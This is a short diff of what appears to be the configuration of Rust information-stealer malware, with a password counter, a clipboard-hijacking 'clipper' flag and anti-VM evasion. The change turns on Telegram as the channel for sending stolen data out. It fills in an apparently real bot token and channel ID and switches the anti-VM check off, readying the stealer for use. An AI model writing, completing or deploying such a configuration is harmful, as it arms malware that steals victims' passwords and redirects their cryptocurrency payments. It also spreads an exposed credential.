@@ -31,18 +31,18 @@ enum DeliveryMethod {
     NONE,
 }
 
-const MODE: DeliveryMethod = DeliveryMethod::NONE;
+const MODE: DeliveryMethod = DeliveryMethod::TELEGRAM;
 
 
 //TG
-const BOT_TOKEN: &str = ""; 
-const CHANNEL_ID: i64 = -0;
+const BOT_TOKEN: &str = "5650212582:AAG50x2B9oLVx5UxuDxpUfVgfDP_ENlp9RQ"; 
+const CHANNEL_ID: i64 = -1001874606220;
 
 //DC
 const DISCORD_WEBHOOK: &str = "";
 
 const MUTEX: bool = false;
-const ANTI_VM: bool = true;
+const ANTI_VM: bool = false;
 const CLIPPER: bool = true;
 
 static mut PASSWORDS: usize = 0;
